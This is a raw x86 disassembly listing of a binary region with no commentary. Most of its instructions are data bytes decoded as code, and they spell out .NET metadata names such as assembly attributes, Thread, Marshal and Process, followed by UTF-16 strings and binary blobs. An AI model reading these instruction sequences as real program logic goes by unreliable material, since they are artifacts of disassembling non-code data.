  4027b3:	jae    0x40281d
  4027b5:	push   ebx
  4027b6:	arpl   WORD PTR [edx+0x65],si
  4027b9:	outs   dx,BYTE PTR gs:[esi]
  4027bb:	add    BYTE PTR [ecx+0x72],ah
  4027be:	addr16 jae 0x4027c1
  4027c1:	gs js  0x4027c4
  4027c4:	popa   
  4027c5:	jo     0x402837
  4027c7:	push   ebp
  4027c8:	jae    0x40282f
  4027ca:	jb     0x402819
  4027cc:	outs   dx,DWORD PTR ds:[esi]
  4027cd:	fs gs ins BYTE PTR es:[edi],dx
  4027d0:	dec    ecx
  4027d1:	add    BYTE PTR fs:[ebx+0x79],dl
  4027d5:	jae    0x40284b
  4027d7:	gs ins DWORD PTR es:[edi],dx
  4027d9:	cs push edx
  4027db:	jne    0x40284b
  4027dd:	je     0x402848
  4027df:	ins    DWORD PTR es:[edi],dx
  4027e0:	gs cs dec ecx
  4027e3:	outs   dx,BYTE PTR ds:[esi]
  4027e4:	je     0x40284b
  4027e6:	jb     0x402857
  4027e8:	jo     0x40283d
  4027ea:	gs jb  0x402863
  4027ed:	imul   esp,DWORD PTR [ebx+0x65],0x614d0073
  4027f4:	jb     0x402869
  4027f6:	push   0x73416c61
  4027fb:	inc    ecx
  4027fc:	je     0x402872
  4027fe:	jb     0x402869
  402800:	bound  esi,QWORD PTR [ebp+0x74]
  402803:	add    BYTE PTR gs:[ebp+0x6e],dl
  402807:	ins    DWORD PTR es:[edi],dx
  402808:	popa   
  402809:	outs   dx,BYTE PTR ds:[esi]
  40280a:	popa   
  40280b:	addr16 gs fs push esp
  40280f:	jns    0x402881
  402811:	add    BYTE PTR gs:[ecx+0x6e],cl
  402815:	inc    ecx
  402816:	je     0x40288c
  402818:	jb     0x402883
  40281a:	bound  esi,QWORD PTR [ebp+0x74]
  40281d:	add    BYTE PTR gs:[ecx+0x63],ah
  402821:	je     0x40288c
  402823:	jbe    0x402886
  402825:	je     0x402890
  402827:	outs   dx,DWORD PTR ds:[esi]
  402828:	outs   dx,BYTE PTR ds:[esi]
  402829:	inc    ebx
  40282a:	outs   dx,DWORD PTR ds:[esi]
  40282b:	outs   dx,BYTE PTR ds:[esi]
  40282c:	je     0x402893
  40282e:	js     0x4028a4
  402830:	add    BYTE PTR [edi+0x70],ch
  402833:	je     0x40289e
  402835:	outs   dx,DWORD PTR ds:[esi]
  402836:	outs   dx,BYTE PTR ds:[esi]
  402837:	jae    0x402839
  402839:	jo     0x4028ad
  40283b:	outs   dx,DWORD PTR ds:[esi]
  40283c:	arpl   WORD PTR [ebp+0x73],sp
  40283f:	jae    0x40288a
  402841:	add    BYTE PTR fs:[edi+0x75],cl
  402845:	je     0x402888
  402847:	je     0x4028bd
  402849:	jb     0x4028b4
  40284b:	bound  esi,QWORD PTR [ebp+0x74]
  40284e:	add    BYTE PTR gs:[ebx+0x79],dl
  402852:	jae    0x4028c8
  402854:	gs ins DWORD PTR es:[edi],dx
  402856:	cs push edx
  402858:	jne    0x4028c8
  40285a:	je     0x4028c5
  40285c:	ins    DWORD PTR es:[edi],dx
  40285d:	gs cs push esi
  402860:	gs jb  0x4028d6
  402863:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40286a:	push   esp
  40286b:	popa   
  40286c:	jb     0x4028d5
  40286e:	gs je  0x4028b7
  402871:	jb     0x4028d4
  402873:	ins    DWORD PTR es:[edi],dx
  402874:	gs ja  0x4028e6
  402877:	jb     0x4028e4
  402879:	inc    ecx
  40287a:	je     0x4028f0
  40287c:	jb     0x4028e7
  40287e:	bound  esi,QWORD PTR [ebp+0x74]
  402881:	add    BYTE PTR gs:[ebx+0x6f],al
  402885:	ins    DWORD PTR es:[edi],dx
  402886:	push   esi
  402887:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40288e:	je     0x402904
  402890:	jb     0x4028fb
  402892:	bound  esi,QWORD PTR [ebp+0x74]
  402895:	add    BYTE PTR gs:[ebx+0x4c],al
  402899:	push   ebx
  40289a:	inc    ebx
  40289b:	outs   dx,DWORD PTR ds:[esi]
  40289c:	ins    DWORD PTR es:[edi],dx
  40289d:	jo     0x40290b
  40289f:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4028a6:	jb     0x402911
  4028a8:	bound  esi,QWORD PTR [ebp+0x74]
  4028ab:	add    BYTE PTR gs:[ebx+0x79],dl
  4028af:	jae    0x402925
  4028b1:	gs ins DWORD PTR es:[edi],dx
  4028b3:	cs push edx
  4028b5:	gs data16 ins BYTE PTR es:[edi],dx
  4028b8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4028bd:	outs   dx,BYTE PTR ds:[esi]
  4028be:	add    BYTE PTR [ecx+0x73],al
  4028c1:	jae    0x402928
  4028c3:	ins    DWORD PTR es:[edi],dx
  4028c4:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4028c8:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4028d0:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4028d7:	jae    0x40294c
  4028d9:	gs ins DWORD PTR es:[edi],dx
  4028db:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4028df:	gs jae 0x402945
  4028e2:	jb     0x40294d
  4028e4:	jo     0x40295a
  4028e6:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4028ed:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4028f4:	jae    0x402969
  4028f6:	gs ins DWORD PTR es:[edi],dx
  4028f8:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4028fc:	gs popaw 
  4028ff:	jne    0x40296d
  402901:	je     0x402944
  402903:	ins    BYTE PTR es:[edi],dx
  402904:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40290b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402912:	jae    0x402987
  402914:	gs ins DWORD PTR es:[edi],dx
  402916:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40291a:	outs   dx,DWORD PTR ds:[esi]
  40291b:	ins    DWORD PTR es:[edi],dx
  40291c:	jo     0x40297f
  40291e:	outs   dx,BYTE PTR ds:[esi]
  40291f:	jns    0x402962
  402921:	je     0x402997
  402923:	jb     0x40298e
  402925:	bound  esi,QWORD PTR [ebp+0x74]
  402928:	add    BYTE PTR gs:[ecx+0x73],al
  40292c:	jae    0x402993
  40292e:	ins    DWORD PTR es:[edi],dx
  40292f:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402933:	jb     0x4029a4
  402935:	fs jne 0x40299b
  402938:	je     0x40297b
  40293a:	je     0x4029b0
  40293c:	jb     0x4029a7
  40293e:	bound  esi,QWORD PTR [ebp+0x74]
  402941:	add    BYTE PTR gs:[ecx+0x73],al
  402945:	jae    0x4029ac
  402947:	ins    DWORD PTR es:[edi],dx
  402948:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40294c:	outs   dx,DWORD PTR ds:[esi]
  40294d:	jo     0x4029c8
  40294f:	jb     0x4029ba
  402951:	addr16 push 0x74744174
  402957:	jb     0x4029c2
  402959:	bound  esi,QWORD PTR [ebp+0x74]
  40295c:	add    BYTE PTR gs:[ecx+0x73],al
  402960:	jae    0x4029c7
  402962:	ins    DWORD PTR es:[edi],dx
  402963:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  402967:	gs jb  0x4029dd
  40296a:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402971:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402978:	jae    0x4029ed
  40297a:	gs ins DWORD PTR es:[edi],dx
  40297c:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402980:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402988:	outs   dx,DWORD PTR ds:[esi]
  402989:	outs   dx,BYTE PTR ds:[esi]
  40298a:	inc    ecx
  40298b:	je     0x402a01
  40298d:	jb     0x4029f8
  40298f:	bound  esi,QWORD PTR [ebp+0x74]
  402992:	add    BYTE PTR gs:[ecx+0x73],al
  402996:	jae    0x4029fd
  402998:	ins    DWORD PTR es:[edi],dx
  402999:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40299d:	outs   dx,BYTE PTR ds:[esi]
  40299e:	outs   dx,WORD PTR ds:[esi]
  4029a0:	jb     0x402a0f
  4029a2:	popa   
  4029a3:	je     0x402a0e
  4029a5:	outs   dx,DWORD PTR ds:[esi]
  4029a6:	outs   dx,BYTE PTR ds:[esi]
  4029a7:	popa   
  4029a8:	ins    BYTE PTR es:[edi],dx
  4029a9:	push   esi
  4029aa:	gs jb  0x402a20
  4029ad:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4029b4:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4029bb:	jns    0x402a30
  4029bd:	je     0x402a24
  4029bf:	ins    DWORD PTR es:[edi],dx
  4029c0:	cs push edx
  4029c2:	gs jae 0x402a34
  4029c5:	jne    0x402a39
  4029c7:	arpl   WORD PTR [ebp+0x73],sp
  4029ca:	add    BYTE PTR [ebx+0x61],dl
  4029cd:	je     0x402a34
  4029cf:	ins    BYTE PTR es:[edi],dx
  4029d0:	ins    BYTE PTR es:[edi],dx
  4029d1:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4029d9:	popa   
  4029da:	arpl   WORD PTR [esi+edx*2+0x65],si
  4029de:	jb     0x402a53
  4029e0:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4029e7:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4029ee:	gs jne 0x402a65
  4029f1:	jb     0x402a54
  4029f3:	ins    BYTE PTR es:[edi],dx
  4029f4:	push   edx
  4029f5:	gs jae 0x402a67
  4029f8:	jne    0x402a6c
  4029fa:	arpl   WORD PTR [ebp+0x73],sp
  4029fd:	dec    esp
  4029fe:	popa   
  4029ff:	outs   dx,BYTE PTR ds:[esi]
  402a00:	addr16 jne 0x402a64
  402a03:	addr16 gs inc ecx
  402a06:	je     0x402a7c
  402a08:	jb     0x402a73
  402a0a:	bound  esi,QWORD PTR [ebp+0x74]
  402a0d:	add    BYTE PTR gs:[ecx+0x73],al
  402a11:	jae    0x402a78
  402a13:	ins    DWORD PTR es:[edi],dx
  402a14:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402a18:	gs ins BYTE PTR es:[edi],dx
  402a1a:	popa   
  402a1b:	jns    0x402a70
  402a1d:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402a24:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402a2b:	jae    0x402aa0
  402a2d:	gs ins DWORD PTR es:[edi],dx
  402a2f:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402a33:	gs jns 0x402a7c
  402a36:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402a3e:	bound  esi,QWORD PTR [ebp+0x74]
  402a41:	add    BYTE PTR gs:[ecx+0x73],al
  402a45:	jae    0x402aac
  402a47:	ins    DWORD PTR es:[edi],dx
  402a48:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  402a4c:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  402a53:	gs dec ebx
  402a55:	gs jns 0x402a99
  402a58:	je     0x402ace
  402a5a:	jb     0x402ac5
  402a5c:	bound  esi,QWORD PTR [ebp+0x74]
  402a5f:	add    BYTE PTR gs:[ebx+0x79],dl
  402a63:	jae    0x402ad9
  402a65:	gs ins DWORD PTR es:[edi],dx
  402a67:	cs push edx
  402a69:	jne    0x402ad9
  402a6b:	je     0x402ad6
  402a6d:	ins    DWORD PTR es:[edi],dx
  402a6e:	gs cs inc ebx
  402a71:	outs   dx,DWORD PTR ds:[esi]
  402a72:	ins    DWORD PTR es:[edi],dx
  402a73:	jo     0x402ade
  402a75:	ins    BYTE PTR es:[edi],dx
  402a76:	gs jb  0x402acc
  402a79:	gs jb  0x402af2
  402a7c:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  402a83:	outs   dx,BYTE PTR ds:[esi]
  402a84:	je     0x402aef
  402a86:	ins    DWORD PTR es:[edi],dx
  402a87:	gs inc ebx
  402a89:	outs   dx,DWORD PTR ds:[esi]
  402a8a:	ins    DWORD PTR es:[edi],dx
  402a8b:	jo     0x402aee
  402a8d:	je     0x402af8
  402a8f:	bound  ebp,QWORD PTR [ecx+0x6c]
  402a92:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402a9a:	bound  esi,QWORD PTR [ebp+0x74]
  402a9d:	add    BYTE PTR gs:[ebx+0x79],dl
  402aa1:	jae    0x402b17
  402aa3:	gs ins DWORD PTR es:[edi],dx
  402aa5:	cs inc esp
  402aa7:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402aae:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  402ab5:	jne    0x402b1e
  402ab7:	addr16 popa 
  402ab9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  402abd:	je     0x402b33
  402abf:	jb     0x402b2a
  402ac1:	bound  esi,QWORD PTR [ebp+0x74]
  402ac4:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  402ac9:	jne    0x402b32
  402acb:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  402ad3:	jae    0x402ad5
  402ad5:	inc    ebx
  402ad6:	outs   dx,DWORD PTR ds:[esi]
  402ad7:	ins    DWORD PTR es:[edi],dx
  402ad8:	jo     0x402b43
  402ada:	ins    BYTE PTR es:[edi],dx
  402adb:	popa   
  402adc:	je     0x402b47
  402ade:	outs   dx,DWORD PTR ds:[esi]
  402adf:	outs   dx,BYTE PTR ds:[esi]
  402ae0:	push   edx
  402ae1:	gs ins BYTE PTR es:[edi],dx
  402ae3:	popa   
  402ae4:	js     0x402b47
  402ae6:	je     0x402b51
  402ae8:	outs   dx,DWORD PTR ds:[esi]
  402ae9:	outs   dx,BYTE PTR ds:[esi]
  402aea:	jae    0x402b2d
  402aec:	je     0x402b62
  402aee:	jb     0x402b59
  402af0:	bound  esi,QWORD PTR [ebp+0x74]
  402af3:	add    BYTE PTR gs:[ebp+0x6e],al
  402af7:	jbe    0x402b62
  402af9:	jb     0x402b6a
  402afb:	outs   dx,BYTE PTR ds:[esi]
  402afc:	ins    DWORD PTR es:[edi],dx
  402afd:	outs   dx,BYTE PTR gs:[esi]
  402aff:	je     0x402b01
  402b01:	inc    edi
  402b02:	gs je  0x402b4a
  402b05:	outs   dx,BYTE PTR ds:[esi]
  402b06:	jbe    0x402b71
  402b08:	jb     0x402b79
  402b0a:	outs   dx,BYTE PTR ds:[esi]
  402b0b:	ins    DWORD PTR es:[edi],dx
  402b0c:	outs   dx,BYTE PTR gs:[esi]
  402b0e:	je     0x402b66
  402b10:	popa   
  402b11:	jb     0x402b7c
  402b13:	popa   
  402b14:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  402b18:	push   ebx
  402b19:	je     0x402b8d
  402b1b:	imul   ebp,DWORD PTR [esi+0x67],0x4e734900
  402b22:	jne    0x402b90
  402b24:	ins    BYTE PTR es:[edi],dx
  402b25:	dec    edi
  402b26:	jb     0x402b6d
  402b28:	ins    DWORD PTR es:[edi],dx
  402b29:	jo     0x402b9f
  402b2b:	jns    0x402b2d
  402b2d:	push   ebx
  402b2e:	jns    0x402ba3
  402b30:	je     0x402b97
  402b32:	ins    DWORD PTR es:[edi],dx
  402b33:	cs inc edi
  402b35:	ins    BYTE PTR es:[edi],dx
  402b36:	outs   dx,DWORD PTR ds:[esi]
  402b37:	bound  esp,QWORD PTR [ecx+0x6c]
  402b3a:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  402b41:	add    BYTE PTR [ebx+0x75],al
  402b44:	ins    BYTE PTR es:[edi],dx
  402b45:	je     0x402bbc
  402b47:	jb     0x402bae
  402b49:	dec    ecx
  402b4a:	outs   dx,BYTE PTR ds:[esi]
  402b4b:	outs   dx,WORD PTR ds:[esi]
  402b4d:	add    BYTE PTR [edi+0x65],ah
  402b50:	je     0x402bb1
  402b52:	inc    ebx
  402b53:	jne    0x402bc7
  402b55:	jb     0x402bbc
  402b57:	outs   dx,BYTE PTR ds:[esi]
  402b58:	je     0x402b9d
  402b5a:	jne    0x402bc8
  402b5c:	je     0x402bd3
  402b5e:	jb     0x402bc5
  402b60:	add    BYTE PTR [ecx+0x6e],cl
  402b63:	je     0x402b98
  402b65:	xor    al,BYTE PTR [eax]
  402b67:	dec    ecx
  402b68:	inc    esi
  402b69:	outs   dx,DWORD PTR ds:[esi]
  402b6a:	jb     0x402bd9
  402b6c:	popa   
  402b6d:	je     0x402bbf
  402b6f:	jb     0x402be0
  402b71:	jbe    0x402bdc
  402b73:	fs gs jb 0x402b77
  402b77:	push   eax
  402b78:	popa   
  402b79:	jb     0x402bee
  402b7b:	add    BYTE PTR gs:[ebx+0x79],dl
  402b7f:	jae    0x402bf5
  402b81:	gs ins DWORD PTR es:[edi],dx
  402b83:	cs push esp
  402b85:	push   0x64616572
  402b8a:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  402b91:	gs popa 
  402b93:	add    BYTE PTR fs:[ebx+0x6c],dl
  402b97:	gs gs jo 0x402b9b
  402b9b:	jae    0x402c02
  402b9d:	je     0x402bfe
  402b9f:	inc    ebp
  402ba0:	js     0x402c0b
  402ba2:	je     0x402be7
  402ba4:	outs   dx,DWORD PTR ds:[esi]
  402ba5:	fs add BYTE PTR gs:[ebp+0x61],cl
  402baa:	jb     0x402c1f
  402bac:	push   0x47006c61
  402bb1:	gs je  0x402bfc
  402bb4:	push   edx
  402bb5:	inc    esi
  402bb6:	outs   dx,DWORD PTR ds:[esi]
  402bb7:	jb     0x402bfe
  402bb9:	js     0x402c1e
  402bbb:	gs jo  0x402c32
  402bbe:	imul   ebp,DWORD PTR [edi+0x6e],0x6f725000
  402bc5:	arpl   WORD PTR [ebp+0x73],sp
  402bc8:	jae    0x402bca
  402bca:	inc    edi
  402bcb:	gs je  0x402c1e
  402bce:	jb     0x402c3f
  402bd0:	arpl   WORD PTR [ebp+0x73],sp
  402bd3:	jae    0x402c17
  402bd5:	jns    0x402c20
  402bd7:	add    BYTE PTR fs:[ecx+0x72],al
  402bdb:	addr16 jne 0x402c4b
  402bde:	outs   dx,BYTE PTR gs:[esi]
  402be0:	je     0x402c27
  402be2:	js     0x402c47
  402be4:	gs jo  0x402c5b
  402be7:	imul   ebp,DWORD PTR [edi+0x6e],0x766e4900
  402bee:	popa   
  402bef:	ins    BYTE PTR es:[edi],dx
  402bf0:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  402bf8:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  402bff:	jo     0x402c75
  402c01:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  402c08:	pop    edi
  402c09:	dec    ecx
  402c0a:	outs   dx,BYTE PTR ds:[esi]
  402c0b:	jbe    0x402c6e
  402c0d:	jb     0x402c78
  402c0f:	popa   
  402c10:	outs   dx,BYTE PTR ds:[esi]
  402c11:	je     0x402c56
  402c13:	jne    0x402c81
  402c15:	je     0x402c8c
  402c17:	jb     0x402c7e
  402c19:	add    BYTE PTR [esi+0x6f],al
  402c1c:	jb     0x402c8b
  402c1e:	popa   
  402c1f:	je     0x402c21
  402c21:	push   esp
  402c22:	jb     0x402c85
  402c24:	arpl   WORD PTR [ebp+0x0],sp
  402c27:	push   edi
  402c28:	jb     0x402c93
  402c2a:	je     0x402c91
  402c2c:	dec    esp
  402c2d:	imul   ebp,DWORD PTR [esi+0x65],0x6d6f4300
  402c34:	dec    ecx
  402c35:	ins    DWORD PTR es:[edi],dx
  402c36:	jo     0x402ca7
  402c38:	jb     0x402cae
  402c3a:	inc    ecx
  402c3b:	je     0x402cb1
  402c3d:	jb     0x402ca8
  402c3f:	bound  esi,QWORD PTR [ebp+0x74]
  402c42:	add    BYTE PTR gs:[ecx+0x6e],cl
  402c46:	je     0x402cad
  402c48:	jb     0x402cb0
  402c4a:	popa   
  402c4b:	arpl   WORD PTR [ebp+0x54],sp
  402c4e:	jns    0x402cc0
  402c50:	gs inc ecx
  402c52:	je     0x402cc8
  402c54:	jb     0x402cbf
  402c56:	bound  esi,QWORD PTR [ebp+0x74]
  402c59:	add    BYTE PTR gs:[ebx+0x6f],al
  402c5d:	ins    DWORD PTR es:[edi],dx
  402c5e:	dec    ecx
  402c5f:	outs   dx,BYTE PTR ds:[esi]
  402c60:	je     0x402cc7
  402c62:	jb     0x402cca
  402c64:	popa   
  402c65:	arpl   WORD PTR [ebp+0x54],sp
  402c68:	jns    0x402cda
  402c6a:	add    BYTE PTR gs:[edi+0x75],al
  402c6e:	imul   esp,DWORD PTR [ecx+eax*2+0x74],0x62697274
  402c76:	jne    0x402cec
  402c78:	add    BYTE PTR gs:[esi+0x6c],al
  402c7c:	popa   
  402c7d:	addr16 jae 0x402cc1
  402c80:	je     0x402cf6
  402c82:	jb     0x402ced
  402c84:	bound  esi,QWORD PTR [ebp+0x74]
  402c87:	add    BYTE PTR gs:[eax],al
  402c8a:	add    BYTE PTR [eax],al
  402c8c:	add    BYTE PTR [ecx],ch
  402c8e:	pop    edi
  402c8f:	add    BYTE PTR [edi+0x0],bl
  402c92:	dec    ecx
  402c93:	add    BYTE PTR [esi+0x0],cl
  402c96:	push   esp
  402c97:	add    BYTE PTR [ebp+0x0],al
  402c9a:	push   edx
  402c9b:	add    BYTE PTR [esi+0x0],cl
  402c9e:	inc    ecx
  402c9f:	add    BYTE PTR [eax+eax*1+0x5f],cl
  402ca3:	add    BYTE PTR [ebx+0x0],dl
  402ca6:	dec    esp
  402ca7:	add    BYTE PTR [ebp+0x0],al
  402caa:	inc    ebp
  402cab:	add    BYTE PTR [eax+0x0],dl
  402cae:	inc    ecx
  402caf:	add    BYTE PTR [ecx+0x0],al
  402cb2:	pop    edi
  402cb3:	add    BYTE PTR [edi+0x0],bl
  402cb6:	add    BYTE PTR [eax+0x61004687],al
  402cbc:	add    BYTE PTR [ecx+0x0],ch
  402cbf:	ins    BYTE PTR es:[edi],dx
  402cc0:	add    BYTE PTR [ebp+0x0],ah
  402cc3:	add    BYTE PTR fs:[eax],ah
  402cc6:	add    BYTE PTR [eax+eax*1+0x6f],dh
  402cca:	add    BYTE PTR [eax],ah
  402ccc:	add    BYTE PTR [ecx+0x0],ah
  402ccf:	arpl   WORD PTR [eax],ax
  402cd1:	je     0x402cd3
  402cd3:	imul   eax,DWORD PTR [eax],0x610076
  402cd9:	je     0x402cdb
  402cdb:	add    BYTE PTR gs:[eax],ah
  402cde:	add    BYTE PTR [edi+0x0],dl
  402ce1:	imul   eax,DWORD PTR [eax],0x64006e
  402ce7:	outs   dx,DWORD PTR ds:[esi]
  402ce8:	add    BYTE PTR [edi+0x0],dh
  402ceb:	jae    0x402ced
  402ced:	and    BYTE PTR [eax],al
  402cef:	push   ebx
  402cf0:	add    BYTE PTR [eax+eax*1+0x6f],dh
  402cf4:	add    BYTE PTR [edx+0x0],dh
  402cf7:	add    BYTE PTR gs:[eax],ah
  402cfa:	add    BYTE PTR [ecx+0x0],ah
  402cfd:	jo     0x402cff
  402cff:	jo     0x402d01
  402d01:	and    BYTE PTR [eax],al
  402d03:	jne    0x402d05
  402d05:	outs   dx,BYTE PTR ds:[esi]
  402d06:	add    BYTE PTR [ecx+0x0],ch
  402d09:	je     0x402d0b
  402d0b:	and    BYTE PTR [eax],al
  402d0d:	je     0x402d0f
  402d0f:	add    BYTE PTR gs:[ebx+0x0],dh
  402d13:	je     0x402d15
  402d15:	and    BYTE PTR [eax],al
  402d17:	add    BYTE PTR gs:[eax+0x0],bh
  402d1b:	add    BYTE PTR gs:[ebx+0x0],ah
  402d1f:	jne    0x402d21
  402d21:	je     0x402d23
  402d23:	outs   dx,DWORD PTR ds:[esi]
  402d24:	add    BYTE PTR [edx+0x0],dh
  402d27:	add    BYTE PTR cs:[eax],ah
  402d2a:	add    BYTE PTR [ebp+0x0],al
  402d2d:	jb     0x402d2f
  402d2f:	jb     0x402d31
  402d31:	outs   dx,DWORD PTR ds:[esi]
  402d32:	add    BYTE PTR [edx+0x0],dh
  402d35:	and    BYTE PTR [eax],al
  402d37:	jnp    0x402d39
  402d39:	xor    BYTE PTR [eax],al
  402d3b:	jge    0x402d3d
  402d3d:	add    BYTE PTR cs:[eax],al
  402d40:	sub    dh,BYTE PTR [edx+0x31dd9283]
  402d46:	cld    
  402d47:	dec    esp
  402d48:	mov    ds:0xb4caae85,eax
  402d4d:	dec    edx
  402d4e:	add    BYTE PTR es:[bx+si],cl
  402d52:	mov    bh,0x7a
  402d54:	pop    esp
  402d55:	push   esi
  402d56:	sbb    DWORD PTR [eax+eiz*8],esi
  402d59:	mov    DWORD PTR ds:0x1d010100,eax
  402d5f:	push   cs
  402d60:	add    eax,0x12010100
  402d65:	or     eax,0x1002003
  402d6a:	or     DWORD PTR [eax],esp
  402d6c:	add    al,0x1
  402d6e:	push   cs
  402d6f:	push   cs
  402d70:	adc    DWORD PTR [eax+edx*1],edx
  402d73:	or     BYTE PTR [edx],al
  402d75:	push   es
  402d76:	or     BYTE PTR [ebx],al
  402d78:	push   es
  402d79:	adc    DWORD PTR [esp+eax*1],edx
  402d7c:	add    BYTE PTR [eax],al
  402d7e:	add    BYTE PTR [eax],al
  402d80:	add    al,0x1
  402d82:	add    BYTE PTR [eax],al
  402d84:	add    BYTE PTR [edx+eax*1],al
  402d87:	add    BYTE PTR [eax],al
  402d89:	add    BYTE PTR [esp+eax*1],al
  402d8c:	add    BYTE PTR [eax],al
  402d8e:	add    BYTE PTR ds:0x11010120,al
  402d94:	adc    eax,0x7011501
  402d99:	add    al,0x20
  402d9b:	add    DWORD PTR [ecx],eax
  402d9d:	push   cs
  402d9e:	add    al,0x20
  402da0:	add    DWORD PTR [ecx],eax
  402da2:	add    al,BYTE PTR ds:0xe010220
  402da8:	push   cs
  402da9:	add    eax,0x11010120
  402dae:	ins    DWORD PTR es:[edi],dx
  402daf:	add    al,0x20
  402db1:	add    DWORD PTR [ecx],eax
  402db3:	or     BYTE PTR [eax+0x2400a0],al
  402db9:	add    BYTE PTR [eax+eax*4],al
  402dbc:	add    BYTE PTR [eax],al
  402dbe:	xchg   esp,eax
  402dbf:	add    BYTE PTR [eax],al
  402dc1:	add    BYTE PTR [esi],al
  402dc3:	add    al,BYTE PTR [eax]
  402dc5:	add    BYTE PTR [eax],al
  402dc7:	and    al,0x0
  402dc9:	add    BYTE PTR [edx+0x53],dl
  402dcc:	inc    ecx
  402dcd:	xor    DWORD PTR [eax],eax
  402dcf:	add    al,0x0
  402dd1:	add    BYTE PTR [ecx],al
  402dd3:	add    BYTE PTR [ecx],al
  402dd5:	add    BYTE PTR [edi],al
  402dd7:	sar    edx,1
  402dd9:	push   edi
  402dda:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  402de0:	test   BYTE PTR [edx+0xdfdae0f],ch
  402de6:	jmp    0xecab2bd3
  402deb:	pop    DWORD PTR [edi+0x6c7603fb]
  402df1:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  402df6:	mov    dl,0x3b
  402df8:	out    0x9a,eax
  402dfa:	(bad)  
  402dfc:	fadd   st(1),st
  402dfe:	fstp   QWORD PTR [edx+0x211336d2]
  402e04:	add    dl,BYTE PTR [eax-0x6c38df5]
  402e0a:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  402e11:	pop    esi
  402e13:	pop    es
  402e14:	ja     0x402e65
  402e16:	sub    eax,ebp
  402e18:	xor    cl,BYTE PTR [esi]
  402e1a:	xchg   edx,eax
  402e1b:	jmp    0xc021:0xe8e4ec05
  402e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e23:	out    dx,eax
  402e24:	call   0x4c9c931a
  402e29:	or     al,0x93
  402e2b:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  402e32:	stos   BYTE PTR es:[edi],al
  402e33:	gs sub al,0x1d
  402e36:	cli    
  402e37:	(bad)  
  402e38:	cmp    eax,0x2d6f5d74
  402e3d:	in     eax,0xf1
  402e3f:	jle    0x402e9f
  402e41:	scas   eax,DWORD PTR es:[edi]
  402e42:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  402e4a:	inc    ebx
  402e4b:	sbb    BYTE PTR gs:[eax],ah
  402e4e:	ins    DWORD PTR es:[edi],dx
  402e4f:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  402e56:	add    al,0x0
  402e58:	add    DWORD PTR [esi],ecx
  402e5a:	push   cs
  402e5b:	add    al,0x0
  402e5d:	add    DWORD PTR [edx],eax
  402e5f:	push   cs
  402e60:	add    al,0x0
  402e62:	add    BYTE PTR [edx],dl
  402e64:	jge    0x402e6d
  402e66:	add    BYTE PTR [edx],al
  402e68:	or     BYTE PTR [esi],cl
  402e6a:	adc    al,BYTE PTR [eax+0x1000485]
  402e70:	add    DWORD PTR [eax],ecx
  402e72:	add    eax,0x12080100
  402e77:	or     eax,0x12010006
  402e7c:	adc    BYTE PTR [ecx+0x7070c08],0xe
  402e83:	or     BYTE PTR [esi],cl
  402e85:	adc    dl,BYTE PTR [eax]
  402e87:	adc    cl,BYTE PTR [edx+edx*1]
  402e8a:	or     eax,0x3000908
  402e8f:	push   cs
  402e90:	adc    al,BYTE PTR [eax+0x1c1d0e85]
  402e96:	add    al,0x0
  402e98:	add    DWORD PTR [ecx],eax
  402e9a:	push   cs
  402e9b:	add    al,0x7
  402e9d:	add    DWORD PTR ds:0x120061c,ebx
  402ea3:	add    DWORD PTR [ecx],edx
  402ea5:	sub    BYTE PTR [ecx+0x1000108],0x0
  402eac:	add    BYTE PTR [eax],al
  402eae:	add    BYTE PTR [eax],al
